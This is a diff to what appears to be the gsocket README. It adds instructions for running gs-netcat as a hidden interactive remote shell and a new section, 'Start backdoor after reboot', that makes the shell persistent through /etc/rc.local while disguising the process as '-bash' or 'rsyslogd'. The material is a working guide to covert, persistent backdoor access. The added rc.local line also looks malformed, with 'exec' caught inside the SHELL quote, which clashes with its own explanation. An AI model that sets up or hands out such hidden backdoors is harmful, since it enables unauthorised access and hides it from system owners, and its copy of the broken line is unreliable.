@@ -177,13 +177,26 @@ $ gs-netcat -g
 
 Pass the arguments by environment variable (GSOCKET_ARGS) and use a bash-trick to hide gs-netcat binary in the process list:
 ```
-$ export GSOCKET_ARGS="-s MySecret -l -i -D"
+$ export GSOCKET_ARGS="-s MySecret -li -q -D"
 $ exec -a -bash ./gs-netcat &     # Hide as '-bash'.
 $ ps alxww | grep gs-netcat
 
 $ ps alxww | grep -bash
   1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
 ```
+
+5. Start backdoor after reboot
+
+Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
+```
+$ cat /etc/rc.local
+#! /bin/bash
+
+(GSOCKET_ARGS="-s MySecret -liqD" SHELL="/bin/bash exec" -a rsyslogd /usr/local/bin/gs-netcat)
+
+exit 0
+```
+The '(...)' brackets start a sub-shell which is then replaced (by *exec*) with gs-netcat. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Set SHELL=/bin/bash to use bash instead of */bin/sh*. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.
 
 ---
 **Crypto / Security Mumble Jumble**
